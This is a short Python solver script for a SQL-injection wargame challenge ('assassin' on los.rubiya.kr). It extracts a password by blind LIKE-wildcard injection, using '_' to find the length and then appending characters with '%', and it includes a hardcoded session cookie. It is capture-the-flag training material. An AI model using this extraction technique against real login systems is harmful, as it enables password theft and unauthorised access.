import requests
import string

url = 'https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?'
cookie = {'PHPSESSID':'pgsatqanllcknmpsej9756rtqq'} 

def pw_length():
    pw_len = 0
    while True:
        pw_len += 1
        query = "pw={}".format("_" * pw_len)
        print(query)
        res = requests.get(url=url+query, cookies=cookie)
        if "Hello guest" in res.text:
            print("PASSWORD LENGTH IS " + str(pw_len))
            break
    return pw_len

def pw_char(pw_len):
    passwd = ""
    for i in range(1, pw_len+1):
        for j in string.printable:
            query = "pw={}{}%".format(passwd,j)
            print(query)
            res = requests.get(url=url+query, cookies=cookie)

            if "Hello admin" in res.text:
                passwd += j
                print("FOUND ADMIN PASSWORD CHAR : " + passwd)
                break

            elif "Hello guest" in res.text:
                passwd += j
                print("FOUND PASSWORD CHAR : " + passwd)
                break
            

    print(passwd)

if __name__ == '__main__':
    pw_len = pw_length()
    pw_char(pw_len)